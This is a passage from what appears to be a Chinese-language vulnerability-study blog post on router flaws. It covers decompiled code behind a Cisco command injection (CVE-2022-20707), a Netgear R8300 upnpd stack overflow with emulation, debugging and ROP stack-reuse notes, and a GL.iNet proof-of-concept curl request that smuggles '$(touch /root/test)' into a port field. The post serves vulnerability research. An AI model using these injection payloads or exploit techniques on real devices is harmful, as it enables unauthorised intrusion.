class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_115D0(const char *a1, const char *a2, const char *a3)</span><br><span class="line">&#123;</span><br><span class="line">  bool v3; // zf</span><br><span class="line">  const char *v8; // r4</span><br><span class="line">  int v9; // r4</span><br><span class="line">  char s[316]; // [sp+Ch] [bp-13Ch] BYREF</span><br><span class="line"></span><br><span class="line">  v3 = a3 == 0;</span><br><span class="line">  if ( a3 )</span><br><span class="line">    v3 = a1 == 0;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    return -1;</span><br><span class="line">  if ( !strcmp(a1, &quot;Firmware&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/firmware&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Configuration&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/configuration&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Certificate&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/in_certs&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Signature&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/signature&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;3g-4g-driver&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/3g-4g-driver&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;Language-pack&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/language-pack&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( !strcmp(a1, &quot;User&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = &quot;/tmp/user&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( strcmp(a1, &quot;Portal&quot;) )</span><br><span class="line">      return -1;</span><br><span class="line">    v8 = &quot;/tmp/www&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !is_file_exist(a2) )</span><br><span class="line">    return -2;</span><br><span class="line">  if ( strlen(a2) &gt; 0x80 || strlen(a3) &gt; 0x80 )</span><br><span class="line">    return -3;</span><br><span class="line">  if ( match_regex((int)&quot;^[a-zA-Z0-9_.-]*$&quot;, (int)a3) )</span><br><span class="line">    return -4;</span><br><span class="line">  sprintf(s, &quot;mv -f %s %s/%s&quot;, a2, v8, a3);</span><br><span class="line">  debug(&quot;cmd=%s&quot;, s);</span><br><span class="line">  if ( !s[0] )</span><br><span class="line">    return -1;</span><br><span class="line">  v9 = system(s);</span><br><span class="line">  if ( v9 &lt; 0 )</span><br><span class="line">    error((int)&quot;upload.cgi: %s(%d) Upload failed!&quot;, (int)&quot;prepare_file&quot;, (const char *)0xB3);</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是上传文件的逻辑，因此a1和a3也得存在，即pathparam和fileparam</p><h2 id="CVE-2022-20707"><a href="#CVE-2022-20707" class="headerlink" title="CVE-2022-20707"></a>CVE-2022-20707</h2><p>一些函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall json_object_object_add(int a1, const char *a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v6; // r0</span><br><span class="line">  int v7; // r4</span><br><span class="line">  int v8; // r4</span><br><span class="line">  char *v9; // r0</span><br><span class="line">  int result; // r0</span><br><span class="line"></span><br><span class="line">  v6 = j_lh_table_lookup_entry(*(_DWORD *)(a1 + 24));</span><br><span class="line">  v7 = v6;</span><br><span class="line">  if ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(v6 + 4);</span><br><span class="line">    if ( result )</span><br><span class="line">      result = j_json_object_put();</span><br><span class="line">    *(_DWORD *)(v7 + 4) = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)(a1 + 24);</span><br><span class="line">    v9 = strdup(a2);</span><br><span class="line">    return j_lh_table_insert(v8, (int)v9, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这段代码是一个用于向 JSON 对象中添加键值对的函数。它使用了一个哈希表来存储对象的键值对。以下是对代码的详细分析：</p><p><strong>参数</strong>：</p><ul><li><code>a1</code>：表示 JSON 对象的指针。</li><li><code>a2</code>：表示要添加的键。</li><li><code>a3</code>：表示要添加的值。</li></ul></blockquote><p>在sub_12684中，如果传入的文件类型是Firmware：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_117E0(int destination, int fileparam, int uploadOption)</span><br><span class="line">&#123;</span><br><span class="line">  bool isZeroFlag; // zf</span><br><span class="line">  int jsonObjRpc; // r5</span><br><span class="line">  int jsonObjParams; // r4</span><br><span class="line">  int jsonObjInput; // r7</span><br><span class="line">  int jsonObjSource; // r10</span><br><span class="line">  int jsonObjDestination; // r8</span><br><span class="line">  int jsonStrRpcVersion; // r0</span><br><span class="line">  int jsonStrMethod; // r0</span><br><span class="line">  int jsonStrRpcAction; // r0</span><br><span class="line">  int jsonStrFileType; // r0</span><br><span class="line">  int locationUrlStr; // r0</span><br><span class="line">  int jsonStrLocationUrl; // r0</span><br><span class="line">  int jsonStrFirmwareState; // r0</span><br><span class="line">  int jsonStrRebootType; // r0</span><br><span class="line">  int jsonObjFirmwareOption; // [sp+4h] [bp-34h]</span><br><span class="line">  int strBuf; // [sp+Ch] [bp-2Ch] BYREF</span><br><span class="line"></span><br><span class="line">  isZeroFlag = fileparam == 0;</span><br><span class="line">  if ( fileparam )</span><br><span class="line">    isZeroFlag = destination == 0;</span><br><span class="line">  if ( isZeroFlag )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( !uploadOption )</span><br><span class="line">    return 0;</span><br><span class="line">  jsonObjRpc = json_object_new_object();</span><br><span class="line">  jsonObjParams = json_object_new_object();</span><br><span class="line">  jsonObjInput = json_object_new_object();</span><br><span class="line">  jsonObjSource = json_object_new_object();</span><br><span class="line">  jsonObjDestination = json_object_new_object();</span><br><span class="line">  jsonObjFirmwareOption = json_object_new_object();</span><br><span class="line">  strBuf = StrBufCreate();</span><br><span class="line">  StrBufSetStr(strBuf, &quot;FILE://Firmware/&quot;);</span><br><span class="line">  StrBufAppendStr(strBuf, fileparam);</span><br><span class="line">  jsonStrRpcVersion = json_object_new_string(&quot;2.0&quot;);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;jsonrpc&quot;, jsonStrRpcVersion);</span><br><span class="line">  jsonStrMethod = json_object_new_string(&quot;action&quot;);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;method&quot;, jsonStrMethod);</span><br><span class="line">  json_object_object_add(jsonObjRpc, (int)&quot;params&quot;, jsonObjInput);</span><br><span class="line">  jsonStrRpcAction = json_object_new_string(&quot;file-copy&quot;);</span><br><span class="line">  json_object_object_add(jsonObjInput, (int)&quot;rpc&quot;, jsonStrRpcAction);</span><br><span class="line">  json_object_object_add(jsonObjInput, (int)&quot;input&quot;, jsonObjParams);</span><br><span class="line">  jsonStrFileType = json_object_new_string(&quot;firmware&quot;);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;fileType&quot;, jsonStrFileType);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;source&quot;, jsonObjSource);</span><br><span class="line">  locationUrlStr = StrBufToStr(strBuf);</span><br><span class="line">  jsonStrLocationUrl = json_object_new_string(locationUrlStr);</span><br><span class="line">  json_object_object_add(jsonObjSource, (int)&quot;location-url&quot;, jsonStrLocationUrl);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;destination&quot;, jsonObjDestination);</span><br><span class="line">  jsonStrFirmwareState = json_object_new_string(destination);</span><br><span class="line">  json_object_object_add(jsonObjDestination, (int)&quot;firmware-state&quot;, jsonStrFirmwareState);</span><br><span class="line">  json_object_object_add(jsonObjParams, (int)&quot;firmware-option&quot;, jsonObjFirmwareOption);</span><br><span class="line">  jsonStrRebootType = json_object_new_string(uploadOption);</span><br><span class="line">  json_object_object_add(jsonObjFirmwareOption, (int)&quot;reboot-type&quot;, jsonStrRebootType);</span><br><span class="line">  StrBufFree(&amp;strBuf);</span><br><span class="line">  return jsonObjRpc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析得出jsonObjRpc是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;action&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;rpc&quot;: &quot;file-copy&quot;,</span><br><span class="line">    &quot;input&quot;: &#123;</span><br><span class="line">      &quot;fileType&quot;: &quot;firmware&quot;,</span><br><span class="line">      &quot;source&quot;: &#123;</span><br><span class="line">        &quot;location-url&quot;: &quot;FILE://Firmware/[fileparam]&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;destination&quot;: &#123;</span><br><span class="line">        &quot;firmware-state&quot;: &quot;[destination]&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;firmware-option&quot;: &#123;</span><br><span class="line">        &quot;reboot-type&quot;: &quot;[uploadOption]&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后接下来是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">json_object = operation_result;</span><br><span class="line">if ( !operation_result )</span><br><span class="line">    goto LABEL_19;</span><br><span class="line">json_string = (const char *)json_object_to_json_string(operation_result);</span><br><span class="line">sprintf(</span><br><span class="line">    curl_command_buffer,</span><br><span class="line">    &quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;,</span><br><span class="line">    url,</span><br><span class="line">    session_id,</span><br><span class="line">    json_string);</span><br><span class="line">curl_output_file = popen(curl_command_buffer, &quot;r&quot;);</span><br></pre></td></tr></table></figure><p>可以看到json_string是通过operation_result得到的，而opration_result就是上述的json结果，而json部分字符串是可控的，因此显然可以进行命令的注入</p><h2 id="CVE-2022-20700（会话伪造）"><a href="#CVE-2022-20700（会话伪造）" class="headerlink" title="CVE-2022-20700（会话伪造）"></a>CVE-2022-20700（会话伪造）</h2><p>通过上述命令执行的漏洞，创建&#x2F;tmp&#x2F;websession&#x2F;下的文本文件（虽然到了最后，环境还是没有成功依靠自己启起来，但是我用了cyberangel师傅之前启用的debian，也是成功啦！！！！！太ql）</p><h2 id="PSV-2020-0211（栈溢出利用RCE）"><a href="#PSV-2020-0211（栈溢出利用RCE）" class="headerlink" title="PSV-2020-0211（栈溢出利用RCE）"></a>PSV-2020-0211（栈溢出利用RCE）</h2><p>netgear R8300 1.0.2.130 的upnp中存在栈溢出的漏洞，主要学习<strong>利用手法</strong>，NVram hook手法，Poc编写 以及 调试技巧</p><ul><li>**UPnP (Universal Plug and Play)**：现在由开放连接基金会管理的是一套网络协议，它允许网络设备无缝地发现彼此在网络上的存在，并为数据共享、通信和娱乐建立功能网络服务。</li></ul><p>UPnP会将某个端口连接到<strong>多播组</strong>，即允许接收其他客户端传输数据（一对多）【或许就是通过这个来使得网络设备可以无缝发现彼此扒】</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349439.png" alt="image-20250228222327229"></p><p>漏洞看着是很简单的，但是由于sub_25E04是通过strcpy来栈溢出的，因此\x00截断便是不可绕过的障碍，而原作者的利用手法值得学习</p><p>启动服务：这次使用用户模式运行</p><p>因为涉及到nvram，使用LD_PRELOAD Hook技术，网上有人已经写好了针对netgear R6250&#x2F;6400的nvram hook，对于R8300也是适用的 <a href="https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c">https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c</a></p><p>使用buildroot进行交叉编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot-2024.11/output/host/bin </span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">arm-linux-gcc -c -O2 -fPIC -Wall ./nvram1.c -o ./nvram1.o</span><br><span class="line">arm-linux-gcc -shared -nostdlib  ./nvram1.o -o ./nvram1.so</span><br></pre></td></tr></table></figure><p>之后创建&#x2F;tmp&#x2F;nvram.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.122.167</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>之后的lan_ipaddr还要连接，因此要把ip起起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.122.167/24 dev virbr0</span><br><span class="line">ip addr show virbr0</span><br></pre></td></tr></table></figure><p>显示对应的ip就代表成功啦</p><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br><span class="line">sudo lsof -i | grep qemu                                                                     </span><br><span class="line">qemu-arm- 6267            root    3u  IPv4  93141      0t0  UDP *:1900 </span><br><span class="line">qemu-arm- 6267            root    4u  IPv4  93142      0t0  UDP *:45791 </span><br><span class="line">qemu-arm- 6267            root    5u  IPv4  93143      0t0  TCP *:5000 (LISTEN)</span><br></pre></td></tr></table></figure><p>如此程序就起起来了，就可以开始Poc的编写了</p><p>调试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 1234 -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><blockquote><p>一开始傻呗了，忘记了用户模式可以直接调试，直接attach pid调试调的是qemu的进程（）</p></blockquote><p>main函数中有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( daemon(1, 1) == -1 )</span><br><span class="line">&#123;</span><br><span class="line">  debug(3, &quot;Fail to run as daemon&quot;);</span><br><span class="line">  v13 = _errno_location();</span><br><span class="line">  exit(*v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>daemon使得当前进程会变成守护进程并保持工作目录不变，但是这个会让该进程脱离gdb的控制，考虑nop掉，成功~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> R0   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R1   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R2   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R3   0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R4   0x61</span><br><span class="line"> R5   0xfffed500 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R6   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R7   0xfffed500 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R8   0xfffed504 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> R9   0x10ab</span><br><span class="line"> R10  0x1</span><br><span class="line"> R11  0xc4584 ◂— 7</span><br><span class="line"> R12  0x553dc —▸ 0xff60393c ◂— push &#123;r4, lr&#125; /* 0xe92d4010 */</span><br><span class="line"> SP   0xfffeceb8 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> PC   0xff603954 ◂— ldrb ip, [r3] /* 0xe5d3c000 */</span><br><span class="line">──────────────────────────────────────────────────────────[ DISASM / arm / set emulate on ]──────────────────────────────────────────────────────────</span><br><span class="line">   0xff603948    ldrb   r4, [r2]</span><br><span class="line">   0xff60394c    cmp    r4, #0</span><br><span class="line">   0xff603950    popeq  &#123;r4, pc&#125;</span><br><span class="line"> ► 0xff603954    ldrb   ip, [r3]</span><br><span class="line">   0xff603958    cmp    r4, ip</span><br><span class="line">   0xff60395c    addeq  r2, r2, #1</span><br><span class="line">   0xff603960    addeq  r3, r3, #1</span><br><span class="line">   0xff603964    beq    #0xff603948                   &lt;0xff603948&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xff603948    ldrb   r4, [r2]</span><br><span class="line">   0xff60394c    cmp    r4, #0</span><br><span class="line">   0xff603950    popeq  &#123;r4, pc&#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp 0xfffeceb8 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">01:0004│    0xfffecebc —▸ 0xb62c ◂— subs r7, r0, #0 /* 0xe2507000 */</span><br><span class="line">02:0008│    0xfffecec0 —▸ 0xfffedefd ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">03:000c│    0xfffecec4 —▸ 0xfffed574 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">04:0010│    0xfffecec8 —▸ 0x8df9 ◂— 0xad</span><br><span class="line">05:0014│    0xfffececc —▸ 0xfffef5f4 ◂— mrchs p9, #1, r3, c2, c1, #1 /* 0x2e323931; &#x27;192.168.122.1&#x27; */</span><br><span class="line">06:0018│    0xfffeced0 —▸ 0xfffed500 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001c│    0xfffeced4 —▸ 0x25e80 ◂— subs sl, r0, #0 /* 0xe250a000 */</span><br><span class="line">────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0xff603954</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>发送大量数据就成功发现栈溢出漏洞</p><p>漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root </span><br><span class="line">&gt; checksec ./usr/sbin/upnpd     </span><br><span class="line">[*] &#x27;/home/s1nec-1o/frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/usr/sbin/upnpd&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>没pie，就启用了nx</p><p><code>SSD</code> 公开的<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">漏洞细节</a>中给出了一个方案：通过 <code>stack reuse</code> 的方式来绕过该限制。具体思路为，先通过 <code>socket</code> 发送第一次数据，往栈上填充相应的 <code>rop payload</code>，同时保证不会造成程序崩溃；再通过 <code>socket</code> 发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现 <code>stack pivot</code>，即劫持栈指针使其指向第一次发送的 <code>payload</code> 处，然后再复用之前的 <code>payload</code> 以完成漏洞利用。<code>SSD</code> 公开的漏洞细节中的示意图如下。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202504062349440.png" alt="image-20250301114232391"></p><p>这里借用的ROP有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000230F0                 ADD             SP, SP, #0x20C</span><br><span class="line">.text:000230F4                 ADD             SP, SP, #0x1000</span><br><span class="line">.text:000230F8                 POP             &#123;R4-R11,PC&#125;</span><br></pre></td></tr></table></figure><p>升栈并且pop出所有关键寄存器，如此只需要提前构造好对应的payload就可以进行ROP啦！</p><p>但是我在构造的时候总是发现它会失败，就算是运行的是发布者写的poc（）总是断在一些奇怪的地方，研究许久后放弃，了解利用手法即可，<strong>reuse stack！</strong></p><h2 id="CVE-2024-39226"><a href="#CVE-2024-39226" class="headerlink" title="CVE-2024-39226"></a>CVE-2024-39226</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;glinet: 1&#x27; 127.0.0.1/rpc -d &#x27;&#123;&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;]&#125;&#x27;</span><br></pre></td></tr></table></figure><p>这是Poc，发现通过本地&#x2F;rpc访问，因此看&#x2F;rpc的api</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location = /rpc &#123;</span><br><span class="line">    content_by_lua_file /usr/share/gl-ngx/oui-rpc.lua;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过&#x2F;usr&#x2F;share&#x2F;gl-ngx&#x2F;oui-rpc.lua;文件处理</p><p>定义了多种方法，Poc中使用call方法给出params变量（oui-rpc.lua定义了很多的方法，通过参数method传入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">local function rpc_method_call(id, params)</span><br><span class="line">    if #params 